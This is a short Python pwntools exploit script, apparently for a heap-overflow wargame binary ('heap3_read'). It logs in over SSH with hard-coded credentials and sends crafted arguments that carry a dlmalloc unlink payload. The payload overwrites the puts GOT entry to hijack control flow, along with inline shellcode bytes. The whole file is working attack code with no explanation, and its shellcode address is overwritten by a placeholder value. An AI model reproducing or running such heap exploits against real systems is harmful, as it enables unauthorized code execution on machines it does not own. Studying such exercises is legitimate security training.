#!/usr/bin/python

import time

from heaplib import HeapPayloadCrafter
from pwn import *
context.arch = "i386"
context.log_level = "debug"

shell = ssh(user="user", host="192.168.5.199", password="user", port=22)

GOT_PUTS = 0x0804b54c
SC       = 0x0804c008 + 8
SC       = 0x47474747

log.level = "DEBUG"
# Generate the heap payload
hpc = HeapPayloadCrafter("dlmalloc", GOT_PUTS, SC,
                                              post_length=32,
                                              pre_length=32,
                                              pre_presets={31: "b"},
                                              post_presets={0:"a"})
prev, metadata, post = hpc.generate_payload()
PREV_SIZE_C, SIZE_C = metadata

# Set up the arguments to the process
arg1 = "A" * 8 + "\x68\x64\x88\x04\x08\xC3" + "AAAA"
arg2 = ''.join(prev) + ''.join([pack(i) for i in metadata])
arg3 = ''.join(post)



# Win!
p = shell.process("/home/user/heap3_read")
time.sleep(5)
p.send(arg1)
time.sleep(2)
p.send(arg2)
time.sleep(2)
p.send(arg3)
time.sleep(2)
log.info("Receiving line : '%s'" % repr(p.recvline()))

raw_input()
